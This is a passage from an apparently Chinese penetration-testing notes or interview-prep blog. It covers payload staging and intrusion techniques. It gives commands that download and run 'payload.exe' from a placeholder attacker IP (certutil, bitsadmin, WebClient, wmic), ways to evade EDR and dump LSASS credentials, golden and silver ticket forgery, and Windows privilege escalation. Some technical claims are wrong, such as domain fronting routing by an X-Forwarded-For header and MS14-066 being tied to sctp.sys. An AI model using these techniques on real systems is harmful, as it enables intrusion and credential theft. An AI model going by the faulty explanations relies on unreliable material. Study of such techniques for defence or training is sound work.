<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$WebClient</span> = <span class="built_in">New-Object</span> System.Net.WebClient</span><br><span class="line"><span class="variable">$WebClient</span>.DownloadFile(<span class="string">&quot;http://&lt;攻击机IP&gt;/payload.exe&quot;</span>, <span class="string">&quot;C:\Users\Public\payload.exe&quot;</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
<p><strong>方法二：使用 <code>certutil</code></strong></p>
<p><code>certutil</code> 是 Windows 系统自带的命令行工具，通常用于管理证书，但它也提供了下载文件的功能</p>
<ul>
<li><p><strong>下载命令</strong></p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil -urlcache -split -f &quot;http://&lt;攻击机IP&gt;/payload.exe&quot; C:\Users\Public\payload.exe</span><br></pre></td></tr></table></figure>

<ul>
<li><code>-urlcache</code>：允许从 URL 下载</li>
<li><code>-split</code>：将下载的文件保存为独立文件</li>
<li><code>-f</code>：强制下载文件</li>
</ul>
</li>
</ul>
<p><strong>方法三：使用 <code>bitsadmin</code></strong></p>
<p><code>bitsadmin</code> 是 Windows 后台智能传输服务（BITS）的命令行工具。BITS 服务主要用于在网络中断后自动恢复下载，非常适合在不稳定网络环境下使用</p>
<ul>
<li><p><strong>下载命令</strong></p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin /transfer myjob http://&lt;攻击机IP&gt;/payload.exe C:\Users\Public\payload.exe</span><br></pre></td></tr></table></figure></li>
</ul>
<p><strong>方法四：使用 SMB 协议</strong></p>
<p>如果你在攻击机上搭建了 SMB 服务器，可以直接通过 SMB 协议传输文件，这在许多环境中比 HTTP 更隐蔽</p>
<ul>
<li><p><strong>下载命令</strong></p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">copy</span> \\&lt;攻击机IP&gt;\share\payload.exe C:\Users\Public\payload.exe</span><br></pre></td></tr></table></figure></li>
</ul>
<p><strong>方法五：将文件内容写入文件</strong></p>
<p>这是一个非常隐蔽的方法，特别适用于 Shell 权限受限，无法直接执行下载命令的情况</p>
<ul>
<li><p><strong>原理</strong>：你将文件的二进制内容转换为文本格式（例如十六进制字符串），然后通过 <code>echo</code> 命令或 <code>certutil -decode</code> 等方式，将文本内容写入一个新文件，并将其解码为可执行文件</p>
</li>
<li><p><strong>示例</strong></p>
<ol>
<li><p>在攻击机上，将 <code>payload.exe</code> 转换为 Base64 编码：<code>base64 payload.exe &gt; payload.b64</code></p>
</li>
<li><p>在目标机上，使用 <code>echo</code> 将 Base64 字符串写入一个临时文件：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> &lt;base64编码字符串&gt; &gt; C:\Users\Public\payload.b64</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用 <code>certutil</code> 将 Base64 文件解码为可执行文件：</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil -decode C:\Users\Public\payload.b64 C:\Users\Public\payload.exe</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
</ul>
<p><strong>3. 文件落地后的执行</strong></p>
<p>文件落地成功后，你需要执行它。执行命令取决于你获得的权限</p>
<ul>
<li><p><strong>在命令行中直接执行</strong> 如果你已经获得了 Shell，可以直接输入文件路径来执行：<code>C:\Users\Public\payload.exe</code></p>
</li>
<li><p><strong>使用 <code>psexec</code></strong> 如果你有域管理员权限，可以使用 <code>psexec</code> 在目标机器上远程执行文件</p>
</li>
<li><p><strong>使用 WMI</strong> 利用 <strong>Windows Management Instrumentation (WMI)</strong>，你可以通过远程方式在目标机器上执行进程</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic <span class="keyword">process</span> call create <span class="string">&quot;C:\Users\Public\payload.exe&quot;</span></span><br></pre></td></tr></table></figure>

<hr>
</li>
</ul>
<h3 id="DB-文件如何解密，原理是什么"><a href="#DB-文件如何解密，原理是什么" class="headerlink" title="DB 文件如何解密，原理是什么"></a>DB 文件如何解密，原理是什么</h3><p>数据库文件解密主要取决于<strong>加密类型</strong>和<strong>密钥的存储位置</strong>。许多数据库系统（如 MySQL、SQL Server、PostgreSQL）都提供了数据加密功能，通常分为以下几种类型：</p>
<ol>
<li><p><strong>文件系统加密</strong>：例如，使用 Linux 的 <code>LUKS</code> 或 Windows 的 <code>BitLocker</code> 等，对整个硬盘分区进行加密。这种情况下，数据库文件本身并没有加密，而是其所在的整个文件系统被加密了</p>
<ul>
<li><strong>解密原理</strong>：只要系统成功启动并解锁了加密分区，你就可以像访问普通文件一样访问 DB 文件。解密的密钥通常存储在系统内存中或 TPM (可信平台模块) 芯片中</li>
</ul>
</li>
<li><p><strong>透明数据加密</strong>：这是一种在数据库级别实现的加密，对整个数据库文件进行实时加密。当数据写入磁盘时，它会被加密；当数据从磁盘读取到内存时，它又会被自动解密</p>
<ul>
<li><strong>解密原理</strong>：TDE 的加密和解密过程对用户是透明的，但它的<strong>加密密钥</strong>通常存储在一个<strong>主密钥（Master Key）或证书</strong>中，而主密钥又被另一个**服务主密钥（Service Master Key）**保护。这些密钥通常与数据库实例或操作系统相关联，因此，即使你拿到加密的 DB 文件，如果没有密钥，也无法解密</li>
</ul>
</li>
<li><p><strong>应用层加密</strong>：数据在被写入数据库之前，由应用程序进行加密</p>
<ul>
<li><strong>解密原理</strong>：这种加密通常依赖于应用程序代码中的硬编码密钥或外部密钥管理服务。解密必须通过应用程序，或者你有能力获取加密密钥并使用相应的加密算法进行解密</li>
</ul>
<hr>
</li>
</ol>
<h3 id="PTH-中-LM-hash-和-NTLM-hash-的区别"><a href="#PTH-中-LM-hash-和-NTLM-hash-的区别" class="headerlink" title="PTH 中 LM hash 和 NTLM hash 的区别"></a>PTH 中 LM hash 和 NTLM hash 的区别</h3><p><strong>LM Hash (LAN Manager Hash)</strong></p>
<ul>
<li><strong>全称</strong>：LAN Manager Hash</li>
<li><strong>哈希算法</strong>：它是一种非常老旧且脆弱的哈希算法，主要用于 Windows NT 4.0 及更早的版本</li>
<li><strong>加密方式</strong>：<ol>
<li>将用户的明文密码转换为大写</li>
<li>如果密码长度超过 14 个字符，只取前 14 个。如果不足 14 个，用空字符填充到 14 个</li>
<li>将 14 个字符的密码分成两部分，每部分 7 个字符</li>
<li>分别使用 DES（Data Encryption Standard）算法进行加密</li>
</ol>
</li>
<li><strong>主要缺陷</strong>：<ul>
<li><strong>不区分大小写</strong>：LM 哈希会将所有字母都转换为大写，导致密码的复杂性大大降低，例如 <code>password</code> 和 <code>PASSWORD</code> 会生成相同的 LM 哈希</li>
<li><strong>分段加密</strong>：将密码分成两段，每段单独加密，这使得哈希破解变得非常容易，攻击者可以分别破解这两段，大大缩短破解时间</li>
<li><strong>无盐值</strong>：它没有使用盐值（Salt），这使得攻击者可以使用彩虹表（Rainbow Table）进行快速破解</li>
</ul>
</li>
</ul>
<p><strong>结论</strong>：LM 哈希非常不安全，很容易在几秒钟内被破解。从 Windows Vista 和 Windows Server 2008 开始，LM 哈希默认是禁用的，除非为了向后兼容性而手动启用</p>
<p><strong>NTLM Hash (NT LAN Manager Hash)</strong></p>
<ul>
<li><p><strong>全称</strong>：NT LAN Manager Hash</p>
</li>
<li><p><strong>哈希算法</strong>：它使用了 <strong>MD4</strong> 哈希算法，并且不对密码进行大小写转换或填充</p>
</li>
<li><p><strong>加密方式</strong>：</p>
<ol>
<li>将用户的明文密码转换为 UTF-16LE 编码</li>
<li>对 UTF-16LE 编码的密码进行 MD4 哈希运算</li>
</ol>
</li>
<li><p><strong>主要特点</strong>：</p>
<ul>
<li><strong>区分大小写</strong>：NTLM 哈希保留了密码的大小写，这增加了哈希破解的难度</li>
<li><strong>没有分段</strong>：它对整个密码进行一次性哈希运算，而不是分段</li>
<li><strong>依然没有盐值</strong>：尽管比 LM 哈希更安全，但 NTLM 哈希仍然没有使用盐值，因此，如果密码简单或在字典中，仍然可以通过彩虹表或字典攻击被破解</li>
</ul>
<hr>
<h3 id="Print-Nightmare-漏洞分析"><a href="#Print-Nightmare-漏洞分析" class="headerlink" title="Print Nightmare 漏洞分析"></a>Print Nightmare 漏洞分析</h3></li>
</ul>
<p><strong>1. 漏洞原理</strong></p>
<p>Print Nightmare 的核心原理是<strong>权限升级</strong>和<strong>任意文件写入</strong>。它利用了 <code>RpcAddPrinterDriver</code> 这个 RPC（远程过程调用）函数中存在的逻辑缺陷</p>
<ul>
<li><strong><code>RpcAddPrinterDriverEx</code> 函数</strong>：这是一个用于在服务器上安装打印机驱动的函数。通常情况下，只有拥有管理员权限的用户才能调用这个函数</li>
<li><strong>非特权用户的利用</strong>：漏洞的根源在于，攻击者发现可以通过一个<strong>普通用户</strong>的身份，调用这个函数，并让其加载一个<strong>恶意的 DLL 文件</strong></li>
<li><strong>权限升级</strong>：当打印后台处理程序（<code>spoolsv.exe</code>）以 <strong>SYSTEM 权限</strong>运行，并加载这个恶意 DLL 文件时，恶意代码也会以 SYSTEM 权限执行，从而实现权限提升</li>
</ul>
<p>简单来说，攻击者利用这个漏洞<strong>欺骗</strong>了 SYSTEM 权限的打印服务，让它去加载一个恶意的 DLL 文件，从而以最高权限运行恶意代码</p>
<p><strong>2. 漏洞利用过程</strong></p>
<p>一个典型的 Print Nightmare 漏洞利用过程可以分为以下几步：</p>
<ol>
<li><strong>准备恶意 DLL</strong>：攻击者首先需要编写一个恶意的 DLL 文件。这个 DLL 文件的核心功能是<strong>建立反向 Shell</strong>、<strong>创建新的管理员账户</strong>或者<strong>执行任意系统命令</strong></li>
<li><strong>准备 SMB 共享</strong>：攻击者将这个恶意 DLL 文件放置在自己的机器上，并通过 **SMB（Server Message Block）**协议共享出来</li>
<li><strong>发起 RPC 请求</strong>：攻击者以一个普通用户的身份，向目标机器的打印服务发起一个 <code>RpcAddPrinterDriverEx</code> RPC 请求</li>
<li><strong>恶意 DLL 加载</strong>：在 RPC 请求中，攻击者指定要加载的驱动文件路径为自己的 SMB 共享路径。当打印服务收到这个请求后，它会以 <strong>SYSTEM 权限</strong>去连接攻击者的 SMB 共享，并加载恶意 DLL 文件</li>
<li><strong>远程代码执行</strong>：一旦 DLL 文件被加载到 <code>spoolsv.exe</code> 进程中，其中的恶意代码就会被执行，从而在目标机器上获得 <strong>SYSTEM 权限</strong></li>
</ol>
<hr>
<h3 id="CS-域前置的原理"><a href="#CS-域前置的原理" class="headerlink" title="CS 域前置的原理"></a>CS 域前置的原理</h3><p><strong>1. 核心原理：CDN 的工作方式</strong></p>
<p>要理解域前置，首先要理解 CDN 的工作原理</p>
<ul>
<li><strong>CDN（Content Delivery Network）</strong>：CDN 的核心作用是加速内容分发。它在全球部署了大量的节点服务器，当用户访问一个网站时，CDN 会将用户的请求重定向到离用户最近的节点上。这样，用户就能更快地获取内容</li>
<li><strong>多域名共享 IP</strong>：一个 CDN 节点通常会为成百上千个不同的域名提供服务。这意味着，<code>cdn.example.com</code> 和 <code>cdn.attacker.com</code> 两个域名，可能解析到<strong>同一个 IP 地址</strong></li>
</ul>
<p><strong>2. 域前置的攻击过程</strong></p>
<p>域前置利用了 CDN 的这个特性，将攻击流量伪装成正常流量。整个过程可以分为以下几步：</p>
<ol>
<li><p><strong>准备阶段</strong>：</p>
<ul>
<li><strong>攻击者域名</strong>：攻击者注册一个自己的域名，例如 <code>attacker.com</code>，并将其配置为 Cobalt Strike 的 C2 域名</li>
<li><strong>CDN 加速</strong>：攻击者将 <code>attacker.com</code> 接入一个大型 CDN 服务，例如 Cloudflare、Akamai 等。这样，<code>attacker.com</code> 就能使用 CDN 的 IP 地址</li>
<li><strong>高信誉域名</strong>：攻击者选择一个在高信誉 CDN 上托管的、合法的、与自己无关的域名，例如 <code>cdn.google.com</code> 或 <code>cdn.bing.com</code>。这个域名就是我们所说的**“域前置”域名**</li>
</ul>
</li>
<li><p><strong>流量伪装</strong>：</p>
<ul>
<li><strong>客户端请求</strong>：受害者的机器（被植入 Beacon 的主机）向 Cobalt Strike C2 发送请求</li>
<li><strong>隐藏真实 C2</strong>：在 HTTP 请求的头部，攻击者做了如下设置：<ul>
<li><code>Host: cdn.google.com</code>：这个头部告诉 CDN 服务器，客户端要访问的是 Google 的 CDN 服务。由于这个域名是高信誉的，防火墙会放行这个流量</li>
<li><code>X-Forwarded-For: cdn.attacker.com</code>：这个头部告诉 CDN，<strong>真实的请求目标是 <code>cdn.attacker.com</code></strong>。这是域前置的关键</li>
</ul>
</li>
</ul>
</li>
<li><p><strong>CDN 转发</strong>：</p>
<ul>
<li>当 CDN 节点收到请求时，它会先查看 <code>Host</code> 头。因为 <code>Host</code> 头是 <code>cdn.google.com</code>，CDN 就会认为这个请求是合法的，并不会拦截</li>
<li>然后，CDN 会根据内部的转发规则，将请求转发到 <code>X-Forwarded-For</code> 头指定的域名所对应的服务器上</li>
<li>最终，请求被转发到了攻击者的 Cobalt Strike C2 服务器</li>
</ul>
<hr>
<h3 id="CS-流量是怎么通信的"><a href="#CS-流量是怎么通信的" class="headerlink" title="CS 流量是怎么通信的"></a>CS 流量是怎么通信的</h3></li>
</ol>
<p><strong>Beacon 的通信模型</strong></p>
<p>Beacon 的通信模式是**客户端-服务器（Client-Server）**模型，其中受害者的机器是客户端，而攻击者控制的 Cobalt Strike 服务器（TeamServer）是服务器</p>
<ul>
<li><strong>客户端（受害者机器）</strong>：Beacon Payload 运行在受害者机器上，它会周期性地向 TeamServer 发送心跳包（”phoning home”），请求任务并上传结果</li>
<li><strong>服务器（TeamServer）</strong>：TeamServer 监听来自 Beacon 的连接，接收其报告，并下发新的命令</li>
</ul>
<p>这种通信模式被称为**“拉取-推送”（Pull-Push）**模型。Beacon 主动向 TeamServer 拉取任务，而不是 TeamServer 主动向受害者机器推送任务。这使得 Beacon 的行为更像一个正常的应用程序，例如一个云同步客户端</p>
<hr>
<h3 id="脏牛漏洞提权原理"><a href="#脏牛漏洞提权原理" class="headerlink" title="脏牛漏洞提权原理"></a>脏牛漏洞提权原理</h3><p><strong>1. 什么是写时复制（CoW）？</strong></p>
<p>在 Linux 系统中，当一个进程需要复制一个文件或共享内存区域时，内核并不会立刻为新进程分配独立的内存空间并复制数据。相反，它会让两个进程共享同一块物理内存</p>
<p>只有当其中一个进程<strong>尝试修改</strong>这块内存中的数据时，内核才会触发“写时复制”机制：</p>
<ul>
<li>内核会为这个正在尝试写入的进程<strong>创建一个新的物理内存副本</strong></li>
<li>这样，原始进程的数据保持不变，而新进程可以在自己的私有内存副本上进行修改，而互不影响</li>
</ul>
<p>这个机制极大地节省了内存和时间，提高了系统的效率</p>
<p><strong>2. 漏洞是如何产生的？</strong></p>
<p>“脏牛”漏洞的本质就在于<strong>写时复制（CoW）机制的一个缺陷</strong></p>
<p>当一个非特权用户尝试访问一个只读文件（例如 <code>/etc/passwd</code>）时，内核会映射这个文件的内存页。按照 CoW 机制，用户无法修改它</p>
<p>然而，内核在处理以下两个操作时，存在一个<strong>竞争条件</strong>：</p>
<ul>
<li><strong>操作一：</strong> 一个线程使用 <code>madvise(MADV_DONTNEED)</code> 系统调用来<strong>丢弃</strong>一个内存页。这个调用告诉内核：我不需要这个页了，你可以把它从内存中释放掉</li>
<li><strong>操作二：</strong> 另一个线程尝试<strong>执行写入操作</strong>，触发 CoW 机制，申请一个新的私有内存页</li>
</ul>
<p>正常的流程应该是：如果一个线程在尝试写入，内核会先为其分配新的内存，然后再进行写入。但是，这个漏洞的巧妙之处在于，通过精巧地控制这两个操作的执行时机，可以制造出一个“时间窗口”</p>
<p>攻击者利用这个时间窗口，在内核准备为写入操作分配新内存之前，通过 <code>madvise()</code> 使得内核错误地<strong>取消了 CoW 的正常流程</strong>。结果是，内核没有为写入操作创建一个私有的内存副本，而是<strong>直接在原始的只读内存页上进行了写入</strong></p>
<p><strong>3. 如何利用这个漏洞？</strong></p>
<p>攻击者利用这个漏洞的流程通常如下：</p>
<ol>
<li><strong>选择目标文件：</strong> 攻击者选择一个具有 root 权限的只读文件，例如 <code>/etc/passwd</code>，该文件包含了系统用户的账户信息</li>
<li><strong>多线程并发：</strong> 攻击者启动两个线程，一个线程不断地尝试对 <code>/etc/passwd</code> 进行写入操作（例如，写入一个新的 root 用户账户），另一个线程则持续调用 <code>madvise()</code> 来触发竞争条件</li>
<li><strong>成功写入：</strong> 在竞争条件被触发的瞬间，写入操作会绕过 CoW 机制，直接修改 <code>/etc/passwd</code> 的内存内容</li>
<li><strong>获取权限：</strong> 攻击者随后会利用修改后的文件，通过新的 root 用户账户成功登录系统，从而获得 root 权限</li>
</ol>
<hr>
<h3 id="黄金票据和白银票据区别"><a href="#黄金票据和白银票据区别" class="headerlink" title="黄金票据和白银票据区别"></a>黄金票据和白银票据区别</h3><p><strong>黄金票据（Golden Ticket）</strong></p>
<p><strong>黄金票据</strong>是一种伪造的 TGT（Ticket Granting Ticket），它允许攻击者以任意用户的身份（通常是域管理员）访问域内所有资源</p>
<p><strong>攻击原理</strong></p>
<p>黄金票据攻击的核心是获取域控制器（Domain Controller，DC）的 <strong>krbtgt 账户哈希</strong>。<code>krbtgt</code> 是一个特殊的服务账户，它用于加密和签名所有颁发的 Kerberos 票据。只要掌握了这个哈希，攻击者就可以在任何机器上离线伪造一个有效的 TGT</p>
<p><strong>攻击步骤</strong></p>
<ol>
<li><strong>权限提升</strong>：攻击者需要先在域内获取一个普通用户的权限，然后通过其他漏洞（如 <code>Zerologon</code> 或 <code>PetitPotam</code>）提升到域管理员权限</li>
<li><strong>获取哈希</strong>：利用像 Mimikatz 这样的工具，从域控制器内存中导出 <code>krbtgt</code> 账户的哈希</li>
<li><strong>伪造票据</strong>：使用 Mimikatz，利用导出的 <code>krbtgt</code> 哈希来伪造一个 TGT。这个 TGT 可以包含任何用户名、SID（用户安全标识符）和组信息，通常会伪造一个高权限用户（如<code>Domain Admins</code>）</li>
<li><strong>权限维持</strong>：伪造的票据可以被攻击者用来请求其他服务票据（ST），从而访问域内所有服务和资源，且无需与域控制器进行任何交互</li>
</ol>
<p><strong>攻击特点</strong></p>
<ul>
<li><strong>攻击范围广</strong>：攻击者可以以任何身份访问域内所有资源，因为伪造的 TGT 是最高级别的认证凭证</li>
<li><strong>权限持久</strong>：只要攻击者拥有 <code>krbtgt</code> 哈希，就可以在任何时间、任何地点伪造新的 TGT，实现了对整个域的永久控制</li>
<li><strong>难以检测</strong>：由于攻击不依赖特定用户的密码，且攻击流量与正常 Kerberos 流量相似，因此在没有专门监控的情况下很难被发现</li>
</ul>
<p><strong>白银票据（Silver Ticket）</strong></p>
<p><strong>白银票据</strong>是一种伪造的 ST（Service Ticket），它允许攻击者以任意用户的身份访问特定的服务，而不是整个域</p>
<p><strong>攻击原理</strong></p>
<p>白银票据攻击的核心是获取特定<strong>服务账户的哈希</strong>。在 Kerberos 中，每个服务（如<code>HTTP</code>、<code>MSSQL</code>、<code>Cifs</code>等）在域内都有一个对应的服务账户。攻击者只要获取了某个服务账户的哈希，就可以伪造一个该服务的有效 ST。</p>
<p><strong>攻击步骤</strong></p>
<ol>
<li><strong>权限提升</strong>：攻击者需要先获取一个普通用户的权限，然后通过其他漏洞获取到目标服务所在的机器的本地管理员权限</li>
<li><strong>获取哈希</strong>：在目标服务器上，利用 Mimikatz 等工具，从内存中导出特定服务账户的哈希</li>
<li><strong>伪造票据</strong>：使用 Mimikatz，利用导出的服务账户哈希来伪造一个 ST。这个 ST 只能用于访问特定的服务，且同样可以包含任意用户名和组信息</li>
<li><strong>访问服务</strong>：伪造的 ST 可以被攻击者用来直接访问该服务，无需经过域控制器进行 TGT 认证</li>
</ol>
<p><strong>攻击特点</strong></p>
<ul>
<li><strong>攻击范围小</strong>：白银票据只能访问特定服务，无法像黄金票据那样横向移动到所有域内资源</li>
<li><strong>无需域控制器</strong>：攻击者可以直接与目标服务进行交互，无需与域控制器进行任何通信，这使得攻击更加隐蔽</li>
<li><strong>相对容易</strong>：相比于黄金票据需要域管理员权限来获取 <code>krbtgt</code> 哈希，白银票据只需要获取特定服务的本地管理员权限，在某些场景下这更容易实现</li>
</ul>
<table>
<thead>
<tr>
<th>特性</th>
<th>黄金票据（Golden Ticket）</th>
<th>白银票据（Silver Ticket）</th>
</tr>
</thead>
<tbody><tr>
<td>伪造对象</td>
<td>TGT（Ticket Granting Ticket）</td>
<td>ST（Service Ticket）</td>
</tr>
<tr>
<td>所需哈希</td>
<td>krbtgt 账户哈希</td>
<td>服务账户哈希（如 HTTP、MSSQL、Cifs 等）</td>
</tr>
<tr>
<td>攻击目标</td>
<td>整个域内所有资源和服务</td>
<td>特定服务（如文件共享、数据库等）</td>
</tr>
<tr>
<td>所需权限</td>
<td>域管理员权限</td>
<td>目标服务所在机器的本地管理员权限</td>
</tr>
<tr>
<td>影响范围</td>
<td>全域控制，可进行任意横向移动，并创建任何权限的用户</td>
<td>单点控制，只能访问特定服务，横向移动受限</td>
</tr>
<tr>
<td>攻击隐蔽性</td>
<td>攻击流量与正常 TGT 流量类似，难以被检测</td>
<td>攻击流量不经过 DC，更加隐蔽</td>
</tr>
</tbody></table>
<hr>
<h3 id="读取不到-hash-怎么绕过"><a href="#读取不到-hash-怎么绕过" class="headerlink" title="读取不到 hash 怎么绕过"></a>读取不到 hash 怎么绕过</h3><p><strong>方法一：绕过 EDR&#x2F;AV 和 LSAProtection</strong></p>
<p>这是最常见的挑战。大多数攻击者会使用 Mimikatz，但它常常被安全软件检测到</p>
<ul>
<li><strong>使用定制或混淆的工具：</strong><ul>
<li><strong>Mimikatz 的变种：</strong> 寻找或自己编译 Mimikatz 的混淆版本（如<code>P-Code</code>、<code>Minidump</code>）。这些版本可能没有被 EDR&#x2F;AV 的签名库收录</li>
<li><strong>不依赖 Mimikatz 的替代工具：</strong> 尝试使用其他开源工具，如 <strong><code>LaZagne</code></strong> 或 <strong><code>DonPAPI</code></strong>。这些工具采用不同的技术来提取凭据，可能绕过某些防御</li>
</ul>
</li>
<li><strong>使用内存转储（Memory Dumping）</strong><ul>
<li><strong><code>procdump.exe</code>：</strong> 这是微软官方的工具，可以合法地转储进程内存。你可以使用它来转储 LSASS 进程，然后在另一台安全的机器上用 Mimikatz 的 <strong><code>sekurlsa::minidump</code></strong> 模块离线分析</li>
<li><strong>注意：</strong> 尽管 <code>procdump</code> 是官方工具，但许多 EDR&#x2F;AV 已经对其进行了监控。你需要小心使用</li>
<li><strong>手动转储：</strong> 也可以使用 Powershell 或 C# 编写代码，直接调用 <code>MiniDumpWriteDump</code> API 来转储 LSASS 进程。这比使用现成的工具更隐蔽</li>
</ul>
</li>
<li><strong>进程注入与内存补丁</strong><ul>
<li>通过注入到合法的进程（如<code>svchost.exe</code>）中，然后从该进程内部转储 LSASS 内存，可以绕过一些基于进程行为的监控</li>
<li><strong>PPL（Protected Process Light）</strong> 绕过：如果目标启用了 PPL，传统的注入方式会失败。可以尝试利用一些已知漏洞或驱动程序来提升权限并绕过 PPL。例如，使用一些内核驱动加载工具，在内核模式下操作</li>
</ul>
</li>
</ul>
<p><strong>方法二：不直接读取哈希，而是获取明文密码</strong></p>
<p>如果哈希实在无法获取，可以考虑获取用户的明文密码</p>
<ul>
<li><strong>键盘记录（Keylogging）：</strong><ul>
<li>部署一个键盘记录程序（如 <strong><code>PowerSploit</code></strong> 中的 <code>Get-Keystrokes</code>），记录用户在登录或输入密码时的按键</li>
<li><strong>优点：</strong> 可以获取明文密码，且绕过了哈希的保护机制</li>
<li><strong>缺点：</strong> 实时性差，需要等待用户输入密码，并且容易被杀毒软件检测</li>
</ul>
</li>
<li><strong>Hooking</strong><ul>
<li>通过在登录或凭据输入过程中，<code>Hook</code> 相关的 WinAPI 函数（如 <code>LsaLogonUser</code>），可以截取到明文密码或哈希</li>
<li><strong>优点：</strong> 实时性高，可以在用户登录时立即获取凭据</li>
<li><strong>缺点：</strong> 实现复杂，需要编写专门的代码，且容易被 EDR&#x2F;AV 拦截</li>
</ul>
</li>
</ul>
<p><strong>方法三：利用其他机制获取凭据</strong></p>
<p>除了 LSASS，凭据还可能存储在其他地方</p>
<ul>
<li><p><strong>注册表（Registry）</strong></p>
<ul>
<li>某些应用程序（如 Putty、TeamViewer 等）可能会将连接密码以加密或明文形式存储在注册表中。可以使用 <strong><code>LaZagne</code></strong> 或其他专用工具扫描注册表</li>
<li>例如：<code>HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon</code> 下可能会存储自动登录的明文密码</li>
</ul>
</li>
<li><p><strong>服务凭据（Service Credentials）</strong></p>
<ul>
<li>许多服务使用服务账户运行，这些账户的凭据通常存储在服务配置中。如果权限足够，可以枚举这些服务并尝试读取其配置</li>
</ul>
</li>
<li><p><strong>浏览器、邮件客户端和 FTP 客户端</strong></p>
<ul>
<li>浏览器（如 Chrome、Firefox）、邮件客户端（如 Outlook）和 FTP 客户端（如 FileZilla）通常会缓存用户的明文密码</li>
<li>可以使用 <strong><code>Mimikatz</code></strong> 的 <strong><code>dpapi::</code></strong> 模块或专门的工具来解密这些存储的凭据</li>
</ul>
<hr>
<h3 id="现在有一台-Windows-Server-2008-如何提权"><a href="#现在有一台-Windows-Server-2008-如何提权" class="headerlink" title="现在有一台 Windows Server 2008 如何提权"></a>现在有一台 Windows Server 2008 如何提权</h3></li>
</ul>
<p><strong>第一步：信息收集</strong></p>
<p>在尝试任何攻击之前，必须先了解你所处的环境。这一步是成功的关键，可以帮助你快速定位可行的提权路径</p>
<ol>
<li><strong>检查当前权限：</strong><ul>
<li><code>whoami /priv</code>：查看当前账户拥有的特权。某些特权（如 <code>SeDebugPrivilege</code>）可以直接用于窃取哈希或执行其他高权限操作</li>
</ul>
</li>
<li><strong>系统信息和补丁：</strong><ul>
<li><code>systeminfo</code>：查看系统版本、架构和安装的补丁列表。这对于判断系统是否对已知的内核漏洞免疫至关重要</li>
<li><code>wmic qfe get Caption,Description,HotFixID,InstalledOn</code>：更详细地查看已安装的补丁</li>
</ul>
</li>
<li><strong>服务和进程：</strong><ul>
<li><code>tasklist /svc</code>：查看哪些服务正在运行，以及它们以什么权限运行</li>
<li><code>Get-Service</code> (PowerShell)：查找以 <code>LocalSystem</code> 或其他高权限账户运行的服务</li>
</ul>
</li>
<li><strong>目录和文件权限：</strong><ul>
<li><code>icacls C:\</code>：检查关键目录（如 <code>C:\Program Files</code>）的写入权限。如果低权限用户可以写入，则可能存在 <strong>DLL 劫持</strong>或 <strong>可执行文件替换</strong>的漏洞</li>
</ul>
</li>
<li><strong>注册表权限：</strong><ul>
<li><code>reg query HKLM</code>：检查注册表键的权限，尤其是那些与服务或自动运行程序相关的键</li>
</ul>
</li>
<li><strong>计划任务：</strong><ul>
<li><code>schtasks /query</code>：查看是否有以高权限账户运行的计划任务，且低权限用户可以修改其执行文件或参数</li>
</ul>
</li>
</ol>
<p><strong>第二步：利用常见的配置错误（首选）</strong></p>
<p>这些方法通常不需要复杂的漏洞利用，成功率高且隐蔽性强</p>
<p><strong>1. 不安全的服务的可执行文件路径</strong></p>
<p>如果一个服务的路径没有用引号括起来，并且路径中包含空格，Windows 会尝试从每个空格分隔的目录中寻找可执行文件</p>
<ul>
<li><strong>示例：</strong> 服务路径为 <code>C:\Program Files\My Service\service.exe</code></li>
<li><strong>Windows 搜索顺序：</strong><ol>
<li><code>C:\Program.exe</code></li>
<li><code>C:\Program Files\My.exe</code></li>
<li><code>C:\Program Files\My Service\service.exe</code></li>
</ol>
</li>
<li><strong>利用方式：</strong> 如果低权限用户对 <code>C:\Program Files</code> 或 <code>C:\</code> 目录有写入权限，就可以在该目录中创建一个恶意的可执行文件（如 <code>My.exe</code>）。当服务重启时，它会首先执行这个恶意程序，从而获得服务的权限</li>
</ul>
<p><strong>2. 服务配置权限不当</strong></p>
<p>如果低权限用户可以修改某个高权限服务的配置，例如更改其二进制文件路径，就可以实现提权</p>
<ul>
<li><strong>检查方法：</strong> <code>sc qc [ServiceName]</code></li>
<li><strong>利用方式：</strong> 使用 <code>sc config</code> 命令修改服务的 <code>binpath</code> 指向你的恶意程序，然后重启服务</li>
</ul>
<p><strong>3. 注册表键 AlwaysInstallElevated</strong></p>
<p>如果以下两个注册表键都为 <code>1</code>，那么任何用户都可以以 <strong>System</strong> 权限运行 MSI 安装文件</p>
<ul>
<li><code>HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated</code></li>
<li><code>HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated</code></li>
<li><strong>利用方式：</strong> 创建一个恶意的 MSI 安装包（可以使用 <code>msfvenom</code> 生成），然后双击运行，它会以 <code>System</code> 权限执行你的代码</li>
</ul>
<p><strong>第三步：利用内核漏洞</strong></p>
<p>如果配置错误的方法都不可行，可以尝试利用 Windows Server 2008 上已知的内核漏洞</p>
<ul>
<li><strong>MS11-046 (AFD.sys):</strong> 这是一个非常经典的漏洞，允许低权限用户提升至 <code>SYSTEM</code> 权限</li>
<li><strong>MS14-066 (sctp.sys):</strong> 另一个著名的权限提升漏洞，通常被用于获得 <code>SYSTEM</code> 权限</li>
<li><strong>MS15-051 (win32k.sys):</strong> 同样是一个广泛使用的权限提升漏洞</li>
</ul>
<p><strong>重要提示：</strong> 在尝试内核漏洞之前，请务必使用 <code>systeminfo</code> 检查是否已打相关补丁。贸然执行漏洞利用程序可能会导致系统蓝屏（BSOD）</p>
